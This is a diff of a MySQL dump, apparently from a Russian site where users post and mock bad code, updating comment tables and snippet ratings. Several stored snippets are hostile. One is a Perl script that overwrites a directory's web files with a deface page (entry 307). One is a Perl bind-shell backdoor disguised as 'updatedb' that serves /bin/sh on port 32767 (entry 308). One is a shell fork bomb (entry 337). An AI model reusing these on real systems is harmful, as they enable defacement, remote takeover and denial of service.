@@ -39,20 +39,24 @@ CREATE TABLE `comments_comments` (
   `rating_count` INTEGER(11) NOT NULL,
   PRIMARY KEY (`id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=8 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=12 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `comments_comments` table  (LIMIT 0,500)
 #
 
 INSERT INTO `comments_comments` (`id`, `obj_id`, `text`, `user_id`, `created`, `folder_id`, `rating`, `rating_count`) VALUES 
-  (1,2565,'test',2,1242007848,1,2,2),
-  (2,2566,'asdf',2,1242007971,1,1,1),
-  (3,2567,'dfgdfg',2,1242007974,1,0,2),
+  (1,2565,'test',2,1242007848,1,3,3),
+  (2,2566,'asdf',2,1242007971,1,2,2),
+  (3,2567,'dfgdfg',2,1242007974,1,1,3),
   (4,2614,'test',2,1242179777,3,0,0),
   (5,2615,'tesdfsdf',2,1242179844,3,0,0),
-  (6,NULL,'test',1,1244109693,1,0,0),
-  (7,NULL,'sdfsdf',1,1244109699,1,1,1);
+  (6,NULL,'test',1,1244109693,1,-1,1),
+  (7,NULL,'sdfsdf',1,1244109699,1,1,1),
+  (8,NULL,'asdf',8,1245402578,13,1,1),
+  (9,NULL,'adfasdf',8,1245402673,13,-1,1),
+  (10,NULL,'test',8,1246528913,2,0,0),
+  (11,NULL,'tresdf',8,1246529655,1,0,0);
 COMMIT;
 
 #
@@ -74,7 +78,7 @@ CREATE TABLE `comments_commentsFolder` (
   UNIQUE KEY `parent_id_2` (`parent_id`, `type`),
   KEY `parent_id` (`parent_id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=11 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=26 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `comments_commentsFolder` table  (LIMIT 0,500)
@@ -90,7 +94,22 @@ INSERT INTO `comments_commentsFolder` (`id`, `obj_id`, `parent_id`, `module`, `t
   (7,2619,353,'quoter','quote','id',0,0),
   (8,2620,352,'quoter','quote','id',0,0),
   (9,2621,350,'quoter','quote','id',0,0),
-  (10,2622,346,'quoter','quote','id',0,0);
+  (10,2622,346,'quoter','quote','id',0,0),
+  (11,2623,136,'quoter','quote','id',0,0),
+  (12,2624,342,'quoter','quote','id',0,0),
+  (13,2625,326,'quoter','quote','id',0,0),
+  (14,2626,327,'quoter','quote','id',0,0),
+  (15,2627,325,'quoter','quote','id',0,0),
+  (16,2628,338,'quoter','quote','id',0,0),
+  (17,2629,337,'quoter','quote','id',0,0),
+  (18,2630,343,'quoter','quote','id',0,0),
+  (19,2631,339,'quoter','quote','id',0,0),
+  (20,2632,299,'quoter','quote','id',0,0),
+  (21,2633,298,'quoter','quote','id',0,0),
+  (22,2634,288,'quoter','quote','id',0,0),
+  (23,2635,349,'quoter','quote','id',0,0),
+  (24,2636,305,'quoter','quote','id',0,0),
+  (25,2637,347,'quoter','quote','id',0,0);
 COMMIT;
 
 #
@@ -136,7 +155,7 @@ CREATE TABLE `comments_comments_tree` (
   `spath` TEXT COLLATE utf8_general_ci,
   PRIMARY KEY (`id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=21 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=25 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `comments_comments_tree` table  (LIMIT 0,500)
@@ -150,10 +169,10 @@ INSERT INTO `comments_comments_tree` (`id`, `path`, `foreign_key`, `level`, `spa
   (5,'4/5/',5,2,'17/18/'),
   (6,'6/',6,1,'19/'),
   (7,'2/7/',7,2,'15/20/'),
-  (8,'6/7/8/',8,3,'6/7/8/'),
-  (9,'9/',9,1,'9/'),
-  (10,'10/',10,1,'10/'),
-  (11,'6/7/8/11/',11,4,'6/7/8/11/'),
+  (8,'8/',8,1,'21/'),
+  (9,'9/',9,1,'22/'),
+  (10,'10/',10,1,'23/'),
+  (11,'2/7/11/',11,3,'15/20/24/'),
   (12,'12/',12,1,'12/'),
   (13,'12/13/',13,2,'12/13/'),
   (14,'1/',1,1,'14/'),
@@ -162,7 +181,11 @@ INSERT INTO `comments_comments_tree` (`id`, `path`, `foreign_key`, `level`, `spa
   (17,'4/',4,1,'17/'),
   (18,'4/5/',5,2,'17/18/'),
   (19,'6/',6,1,'19/'),
-  (20,'2/7/',7,2,'15/20/');
+  (20,'2/7/',7,2,'15/20/'),
+  (21,'8/',8,1,'21/'),
+  (22,'9/',9,1,'22/'),
+  (23,'10/',10,1,'23/'),
+  (24,'2/7/11/',11,3,'15/20/24/');
 COMMIT;
 
 #
@@ -669,14 +692,14 @@ INSERT INTO `quoter_quote` (`id`, `obj_id`, `category_id`, `created`, `deleted`,
   (295,2002,7,1230319636,1230421755,'for(int i=0;i<m_tabWidget->count();i++){\r\n\t\ttextEdit = (TextEdit*)m_tabWidget->widget(i);\r\n\t\tif( textEdit && textEdit->close()){\r\n\t\t\tdelete textEdit;\r\n\t\t\ttextEdit = 0;\r\n\t\t}\r\n                else break;\r\n\t}','','Часто забывают, что количество элементов в списке изменяется при удалении из него.',-10,0,0,3),
   (296,2017,8,1230412761,0,'int CompareTo (A a1, A a2)\r\n{\r\n   if (a1.Year>a2.Year) return 1;\r\n   if (a1.Year<a2.Year) return -1;\r\n    return 0;\r\n}','','реализация интерфейса IComparable, чем не понравилось стандартное норминрование: return a1.Year - a2.Year; так и не понял\r\n\r\n',11,0,1,5),
   (297,2024,1,1230458235,0,'$dayofmonth = date(''t'');\r\n$day_count = 1;\r\n\r\n$num = 0;\r\nfor($i = 0; $i < 7; $i++)\r\n{\r\n\t$dayofweek = date(''w'', mktime(0, 0, 0, date(''m''), $day_count, date(''Y'')));\r\n\t$dayofweek = $dayofweek - 1;\r\n\tif($dayofweek == -1) $dayofweek = 6;\r\n\tif($dayofweek == $i)\r\n\t{\r\n\t\t$week[$num][$i] = $day_count;\r\n\t\t$day_count++;\r\n\t}\r\n\telse $week[$num][$i] = \"\";\r\n}\r\n\r\nwhile(true)\r\n{\r\n\t$num++;\r\n\tfor($i = 0; $i < 7; $i++)\r\n\t{\r\n\t\t$week[$num][$i] = $day_count;\r\n\t\t$day_count++;\r\n\t\tif($day_count > $dayofmonth) break;\r\n\t}\r\n    if($day_count > $dayofmonth) break;\r\n}','','взято с softtime.ru, PHP5 самоучитель',10,0,1,1),
-  (298,2033,8,1230483406,0,'if (current_switch == true)\r\n{\r\n//вырезано\r\n}\r\nelse if (current_switch == false)\r\n{\r\n//вырезано\r\n}','','Данный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\n\r\nхакеры пля...=\\',44,0,1,2),
-  (299,2035,8,1230483735,0,'public static void brute(long diap)\r\n{\r\nn = 68491; //задаем некое число\r\nNewMessage(\"w8. Bruteforce working...\"); //вызываем событие\r\nfor (int i = 0; i < diap; i++) //мутим цикл\r\n{\r\nd = i;\r\nstring brute = Convert.ToString(bug.Equals(n, d)); //сравниваем и возвращаем результат в строку\r\nif (brute == \"True\")\r\n{\r\nBruteComplete(d.ToString()); //вызываем событие при удачном переборе\r\nbreak;\r\n}\r\n}\r\nif (ok == false)\r\n{\r\nNewMessage(\"Brete Failed:(\");\r\n}\r\n}','','Еще один:\r\nДанный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\nТут программа должна подобрать число n. Как я понял тип n тут или не указан или переменная глобальная. Но нахрена тогда её объявлять глобальной если она применяется только в этом методе. Далее, d = i это вообще пиздец, да конечно же, если n это объект, а не int то все правильно. Но мне кажется автор полный мудак после того что создал строку brute, блять, конвертировал bool d string и сравнивает строку вида True с true. пиздец, пиздец....уебки...руки поотрывать...\r\nхакеры пля...=\\',105,0,1,12),
+  (298,2033,8,1230483406,0,'if (current_switch == true)\r\n{\r\n//вырезано\r\n}\r\nelse if (current_switch == false)\r\n{\r\n//вырезано\r\n}','','Данный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\n\r\nхакеры пля...=\\',44,0,1,0),
+  (299,2035,8,1230483735,0,'public static void brute(long diap)\r\n{\r\nn = 68491; //задаем некое число\r\nNewMessage(\"w8. Bruteforce working...\"); //вызываем событие\r\nfor (int i = 0; i < diap; i++) //мутим цикл\r\n{\r\nd = i;\r\nstring brute = Convert.ToString(bug.Equals(n, d)); //сравниваем и возвращаем результат в строку\r\nif (brute == \"True\")\r\n{\r\nBruteComplete(d.ToString()); //вызываем событие при удачном переборе\r\nbreak;\r\n}\r\n}\r\nif (ok == false)\r\n{\r\nNewMessage(\"Brete Failed:(\");\r\n}\r\n}','','Еще один:\r\nДанный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\nТут программа должна подобрать число n. Как я понял тип n тут или не указан или переменная глобальная. Но нахрена тогда её объявлять глобальной если она применяется только в этом методе. Далее, d = i это вообще пиздец, да конечно же, если n это объект, а не int то все правильно. Но мне кажется автор полный мудак после того что создал строку brute, блять, конвертировал bool d string и сравнивает строку вида True с true. пиздец, пиздец....уебки...руки поотрывать...\r\nхакеры пля...=\\',105,0,1,0),
   (300,2037,1,1230484192,1230548267,'<?php\r\ndefine(''true'',false);\r\n?>','','-',-16,0,0,1),
   (301,2039,1,1230484226,1230545532,'\\n\r\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n','','12145',-16,0,0,0),
   (302,2046,1,1230496042,1230558898,'<?php\r\n// © Eugen :)\r\n// ...\r\nfunction fuck($v) {\r\n    global $pizdec;\r\n    // ...\r\n}\r\n// ...\r\n?>','','Оптимистически...',-16,0,0,0),
   (303,2049,9,1230536213,0,'private List<WorkOrderWrapper> copy(List<WorkOrderWrapper> src) {\r\n\t\tList<WorkOrderWrapper> ret = Collections.emptyList();\r\n\r\n\t\tif (src != null) {\r\n\t\t\tret = new ArrayList<WorkOrderWrapper>(src.size());\r\n\r\n\t\t\tfor (int i = src.size() - 1; i >= 0; i--) {\r\n\t\t\t\tret.add(src.get(i));\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}','','Мы легких путей не ищем!',8,0,1,0),
   (304,2053,1,1230556548,0,'$this->mm = ($this->md[2] < 4) ? ($this->md[2] < 3) ? ($this->md[2] < 2) ? imagecreatefromgif($this->mi) : imagecreatefromjpeg($this->mi) : imagecreatefrompng($this->mi) : Null;','','Загрузка изображения в VaMShop',10,0,1,0),
-  (305,2055,1,1230557770,0,'set_include_path(  dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.\r\n    ''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''.DIRECTORY_SEPARATOR.''DoctrineTest''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''.DIRECTORY_SEPARATOR.''BaseClasses''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''smarty''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''jsPacker''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''FirePHPLibrary''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . get_include_path());','','',29,0,1,1),
+  (305,2055,1,1230557770,0,'set_include_path(  dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.\r\n    ''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''.DIRECTORY_SEPARATOR.''DoctrineTest''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''.DIRECTORY_SEPARATOR.''BaseClasses''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''smarty''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''jsPacker''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''FirePHPLibrary''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . get_include_path());','','',29,0,1,0),
   (306,2060,12,1230558876,1230707807,'push esp\r\npush $00000101\r\nmov eax,[$0044ee50]\r\nmov eax,[eax] ;eax = 0\r\ncall eax','','Вызывал функцию WSAStartup в дельфе, но забыл из какого она юнита. Хелп показал 2 пункта WSAStartup, не подумал тупо скопировал IdWinsock (вместо Winsock). Запускаю - access violation. В дебагере ctrl+c. Дельфя скомпилила так, что в любом случае вылетает аксес :)',-4,0,0,10),
   (307,2085,4,1230586464,0,'#!/usr/bin/perl -w \r\n#Masss Defacer v2.0 \r\n# Coded By illuz1oN \r\n# Creditz - Nostur \r\n$def = ''YOUR LAME DEFACE PAGE HERE =)''; \r\n{        print \"[+]DEFACING...\\n\"; \r\n         print\"[+]DEFACING .PHP FILES...\\n\"; \r\n\t\t my @php = glob(\"*.php\"); #Files \r\n     foreach my $deface(@php){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .HTML FILES...\\n\"; \r\n         my @html = glob(\"*.html\"); #Files \r\n     foreach my $deface(@html){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .ASP FILES...\\n\"; \r\n\t\t my @asp = glob(\"*.asp\"); #Files \r\n     foreach my $deface(@asp){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .ASPX FILES...\\n\"; \r\n\t\t my @aspx = glob(\"*.aspx\"); #Files \r\n     foreach my $deface(@aspx){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .HTM FILES...\\n\"; \r\n\t\tmy @htm = glob(\"*.htm\"); #Files \r\n     foreach my $deface(@htm){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .JS FILES...\\n\"; \r\n\tmy @js = glob(\"*.js\"); #Files \r\n     foreach my $deface(@js){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .AC FILES...\\n\"; \r\n\t\t my @ac = glob(\"*.ac\"); #Files \r\n     foreach my $deface(@ac){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n  print \"[+]Pages Should Be Defaced!\\n\"; \r\n \r\n} \r\n#Coded By illuz1oN \r\n#Credits - Nostur!','','',4,0,1,0),
   (308,2088,4,1230592242,0,'#!/usr/bin/perl\r\n\r\n$port = 32767;\r\n$port = $ARGV[0] if $ARGV[0];\r\nexit if fork;\r\n$0 = \"updatedb\" . \" \" x100;\r\n$SIG{CHLD} = ''IGNORE'';\r\nuse Socket;\r\nsocket(S, PF_INET, SOCK_STREAM, 0);\r\nsetsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);\r\nbind(S, sockaddr_in($port, INADDR_ANY));\r\nlisten(S, 50);\r\nwhile(1)\r\n{\r\n    accept(X, S);\r\n    unless(fork)\r\n    {\r\n        open STDIN, \"<&X\";\r\n        open STDOUT, \">&X\";\r\n        open STDERR, \">&X\";\r\n        close X;\r\n        exec(\"/bin/sh\");\r\n    }\r\n    close X;\r\n}','','',3,0,1,1),
@@ -695,9 +718,9 @@ INSERT INTO `quoter_quote` (`id`, `obj_id`, `category_id`, `created`, `deleted`,
   (321,2159,1,1230834929,1230967411,'<?php\r\nfunction word_filter($str) {\r\n\t$filtered = '''';\r\n\tfor ($i = 0; $i <= strlen($str) - 1; $i++) {\r\n\t\t$char = substr($str, $i, 1);\r\n\t\tif (ctype_alpha($char)) {\r\n\t\t\t$filtered .= $char;\r\n\t\t}\r\n\t}\r\n\treturn $filtered;\r\n}','','как делают дебилы: $i <= strlen($str) - 1;\r\nкто знает, так - $j = strlen($str), $i < $j',-12,0,0,8),
   (322,2171,1,1230910702,0,'if(count($a)>0)\r\n{\r\n\tfor($i=0; $i<count($a); $i++)\r\n\t{\r\n\t\t//код код код\r\n\t}\r\n}','','что-то подобное)',20,0,1,2),
   (324,2179,1,1230930137,0,'<?php\r\nfunction is_featured($word_id) {\r\n\t$sql = \"SELECT * FROM `featured` WHERE `featured_id` = ''$word_id''\";\r\n\t$results = mysql_query($sql);\r\n\tif (mysql_num_rows($results)) {\r\n\t\treturn true;\r\n\t} else {\r\n\t\treturn false;\r\n\t}\r\n}','','Классический говнокод, встречаю очень часто',5,0,1,8),
-  (325,2181,7,1230938478,0,'BOOL ConvertDays(UINT32 days, SYSTEMTIME* lpTime)\r\n{\r\n    int dayofweek, month, year;\r\n    UINT8 *month_tab;\r\n\r\n    //Calculate current day of the week\r\n    dayofweek = GetDayOfWeek(days);\r\n\r\n    year = ORIGINYEAR;\r\n\r\n    while (days > 365)\r\n    {\r\n        if (IsLeapYear(year))\r\n        {\r\n            if (days > 366)\r\n            {\r\n                days -= 366;\r\n                year += 1;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            days -= 365;\r\n            year += 1;\r\n        }\r\n    }\r\n\r\n\r\n    // Determine whether it is a leap year\r\n    month_tab = (UINT8 *)((IsLeapYear(year))? monthtable_leap : monthtable);\r\n\r\n    for (month=0; month<12; month++)\r\n    {\r\n        if (days <= month_tab[month])\r\n            break;\r\n        days -= month_tab[month];\r\n    }\r\n\r\n    month += 1;\r\n\r\n    lpTime->wDay = days;\r\n    lpTime->wDayOfWeek = dayofweek;\r\n    lpTime->wMonth = month;\r\n    lpTime->wYear = year;\r\n\r\n    return TRUE;\r\n}','','То что вызвало зависание всех MS Zune 30Gb по всему миру.',6,0,1,1),
-  (326,2188,1,1230984221,0,'if ($_POST[''id'']) {\r\n  $id = $_POST[''id''];\r\n} elseif ($_GET[''id'']) {\r\n  $id = $_GET[''id''];\r\n}\r\nif (isset($_POST[''password''])) {\r\n  $password = md5($_POST[''password'']);\r\n} elseif (isset($_GET[''password''])) {\r\n  $password = md5($_GET[''password'']);\r\n}','','',8,0,1,1),
-  (327,2191,1,1230990413,0,'$price = round(100*$price*$selected_currency_details[1])/100;\r\n\tif (round($price*10) == $price*10 && round($price)!=$price)\r\n\t\t$price = \"$price\".\"0\"; //to avoid prices like 17.5 - write 17.50 instead','','  Shop-Script PREMIUM',24,0,1,2),
+  (325,2181,7,1230938478,0,'BOOL ConvertDays(UINT32 days, SYSTEMTIME* lpTime)\r\n{\r\n    int dayofweek, month, year;\r\n    UINT8 *month_tab;\r\n\r\n    //Calculate current day of the week\r\n    dayofweek = GetDayOfWeek(days);\r\n\r\n    year = ORIGINYEAR;\r\n\r\n    while (days > 365)\r\n    {\r\n        if (IsLeapYear(year))\r\n        {\r\n            if (days > 366)\r\n            {\r\n                days -= 366;\r\n                year += 1;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            days -= 365;\r\n            year += 1;\r\n        }\r\n    }\r\n\r\n\r\n    // Determine whether it is a leap year\r\n    month_tab = (UINT8 *)((IsLeapYear(year))? monthtable_leap : monthtable);\r\n\r\n    for (month=0; month<12; month++)\r\n    {\r\n        if (days <= month_tab[month])\r\n            break;\r\n        days -= month_tab[month];\r\n    }\r\n\r\n    month += 1;\r\n\r\n    lpTime->wDay = days;\r\n    lpTime->wDayOfWeek = dayofweek;\r\n    lpTime->wMonth = month;\r\n    lpTime->wYear = year;\r\n\r\n    return TRUE;\r\n}','','То что вызвало зависание всех MS Zune 30Gb по всему миру.',6,0,1,0),
+  (326,2188,1,1230984221,0,'if ($_POST[''id'']) {\r\n  $id = $_POST[''id''];\r\n} elseif ($_GET[''id'']) {\r\n  $id = $_GET[''id''];\r\n}\r\nif (isset($_POST[''password''])) {\r\n  $password = md5($_POST[''password'']);\r\n} elseif (isset($_GET[''password''])) {\r\n  $password = md5($_GET[''password'']);\r\n}','','',9,1,1,2),
+  (327,2191,1,1230990413,0,'$price = round(100*$price*$selected_currency_details[1])/100;\r\n\tif (round($price*10) == $price*10 && round($price)!=$price)\r\n\t\t$price = \"$price\".\"0\"; //to avoid prices like 17.5 - write 17.50 instead','','  Shop-Script PREMIUM',24,0,1,0),
   (328,2201,1,1231064150,0,'$rand = rand ( 100, 1000000000 );\r\n$sess = md5 ( $rand );\r\necho \"<form method=\\\"post\\\" action=\\\"?sid=\" . $sess . \">\";\r\necho \"Введите код с картинки: \" . $rand . \"<br>\";\r\necho \"<input name=\\\"cod\\\"><br>\";\r\necho \"<input type=\\\"submit\\\" value=\\\"Отправить\\\">','','сильнейшая капча',23,0,1,2),
   (329,2205,12,1231074205,1231179003,'BuildRotateMatrix_:\r\n\tmov edi,offset _RotateM\r\n\r\n\tfld [esi]._x\r\n\tfsincos\r\n\r\n\tfld [esi]._y\r\n\tfsincos\r\n\r\n\tfld [esi]._z\r\n\tfsincos\r\n\r\n\tfld st(0)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E00\r\n\r\n\tfld st(2)\r\n\tfmul st(0),st(2)\r\n\tfstp [edi]._E01\r\n\r\n\tfld st(3)\r\n\tfchs\r\n\tfstp [edi]._E02\r\n\t\r\n\tfld st(5)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(1)\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\r\n\tfsubp st(1),st(0)\r\n\tfstp [edi]._E10\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\tfmul st(0),st(1)\r\n\tfld st(5)\r\n\tfmul st(0),st(4)\r\n\tfaddp st(1),st(0)\r\n\tfstp [edi]._E11\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E12\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(1)\r\n\r\n\tfld st(6)\r\n\tfmul st(0),st(3)\r\n\r\n\tfaddp st(1),st(0)\r\n\tfstp [edi]._E20\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(2)\r\n\r\n\tfld st(6)\r\n\tfmul st(0),st(2)\r\n\r\n\tfsubp st(1),st(0)\r\n\tfstp [edi]._E21\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E22\r\n\r\n\tfinit\r\n\r\n\tfld1\r\n\tfstp [edi]._E33\r\n\r\n\txor eax,eax\r\n\tmov [edi]._E03,eax\r\n\tmov [edi]._E13,eax\r\n\tmov [edi]._E23,eax\r\n\r\n\tmov [edi]._E30,eax\r\n\tmov [edi]._E31,eax\r\n\tmov [edi]._E32,eax\r\n\r\n\tret','','На самом деле это не говнокод, но на осомблере всё выглядит как кусок говна :3',-10,0,0,0),
   (330,2218,12,1231106828,1231201209,'db \"Ассемблер язык настолько суровый, что для него нет понятия говнокода!\"','','',-10,0,0,0),
@@ -707,7 +730,7 @@ INSERT INTO `quoter_quote` (`id`, `obj_id`, `category_id`, `created`, `deleted`,
   (334,2234,1,1231242350,0,'function _isArr($value, $Arr) {\r\n\t\tif(!isset($Arr))\r\n\t\t\treturn true;\r\n\t\tfor($i=0;$i<count($Arr);$i++)\r\n\t\t\tif($Arr[$i]==$value)\r\n\t\t\t\treturn true;\r\n\t\treturn false;\r\n\t}','','Смотрим, самая нужная функция...ну после in_array конечно...и обратите внимание, проверить обязательный параметр на наличие внутри функции обязательно!',5,0,1,2),
   (335,2236,1,1231248312,0,'if ($prev > $next || $prev == $next)\r\n    $next = 0 ;','','',10,0,1,0),
   (336,2239,1,1231254337,1231326769,'Процедура ВакансииРаботодателя()\r\n   \r\n    Таб=СоздатьОбъект(\"Таблица\");\r\n    Таб.ИсходнаяТаблица(\"НайденныеВакансии\");\r\n    Таб.ВывестиСекцию(\"Все<\");\r\n   \r\n    СпрВакансии=СоздатьОбъект(\"Справочник.Вакансии\");\r\n   \r\n   НомПП=0;\r\n   СпрВакансии.ВыбратьЭлементыПоРеквизиту(\"Работодатель\",ТекущийЭлемент(),0,0);\r\n   Пока СпрВакансии.ПолучитьЭлемент()=1 Цикл   \r\n      \r\n      НомПП=НомПП+1;\r\n      Таб.ВывестиСекцию(\"Вакансия\");\r\n      \r\n   КонецЦикла;   \r\n   \r\n   Таб.ВывестиСекцию(\"Все>\");\r\n   Таб.ТолькоПросмотр(1);\r\n   Таб.Показать();\r\n   \r\nКонецПроцедуры','','КОД НА 1С!!!\r\nХоть все и работает, но говнокод сам язык)))',-14,0,0,0),
-  (337,2242,4,1231254930,0,':(){ :&:;};:','','Смайлики на POSIX Shell',0,0,1,0),
+  (337,2242,4,1231254930,0,':(){ :&:;};:','','Смайлики на POSIX Shell',1,1,1,0),
